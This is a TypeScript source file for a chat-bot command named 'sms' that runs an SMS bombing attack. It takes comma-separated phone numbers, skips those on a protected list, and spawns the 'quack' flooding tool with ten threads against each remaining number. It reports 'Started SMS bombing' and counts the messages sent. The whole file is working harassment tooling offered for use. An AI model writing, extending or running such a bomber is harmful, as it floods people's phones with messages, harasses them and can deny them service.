import command from '../types/command';
import { ChildProcessWithoutNullStreams, spawn } from 'child_process';

const sms: command = {
  name: 'sms',
  async execute(ctx, params) {
    const { storage } = params;
    const bannedNumbers = await storage.getContainer('bannedNumbers');

    const args: string[] = (ctx as any).state.command.splitArgs;

    if (parseInt(args[1]) > 120) {
      ctx.reply(`The timeout is too big, current limit is: ${60}`);
    } else {
      const numbers_filtered = args[0]
        .split(',')
        .filter((element) => !bannedNumbers.has(element));
      const protected_numbers = args[0]
        .split(',')
        .filter((element) => bannedNumbers.has(element));

      if (protected_numbers.length > 0) {
        ctx.reply(`${protected_numbers.join(', ')} are protected numbers`);
      }
      if (numbers_filtered.length > 0) {
        ctx.reply(`Started SMS bombing on ${numbers_filtered.join(', ')}`);
      }

      for (let i = 0; i < numbers_filtered.length; i++) {
        setTimeout(function () {
          const ls = spawn('quack', [
            '--tool',
            'sms',
            '--target',
            numbers_filtered[i],
            '--timeout',
            args[1],
            '--threads',
            '10',
          ]);
          executeBombing(ls);
        }, i * 7000);
      }
    }

    function executeBombing(ls: ChildProcessWithoutNullStreams) {
      let amount = 0;
      ls.stdout.on('data', (data) => {
        const split = String(data).split(/\r?\n/);
        for (let i = 0; i < split.length; i++) {
          if (split[i].indexOf('[+]') != -1) {
            amount++;
          }
        }
      });

      ls.stderr.on('data', (data) => {
        ctx.reply('There was an error: ' + data);
      });

      ls.on('error', (error) => {
        ctx.reply('There was an error: ' + error.message);
      });

      ls.on('close', (code) => {
        ctx.reply(`Bombing completed, ${amount} messages sent`);
      });
    }
  },
};

export default sms;
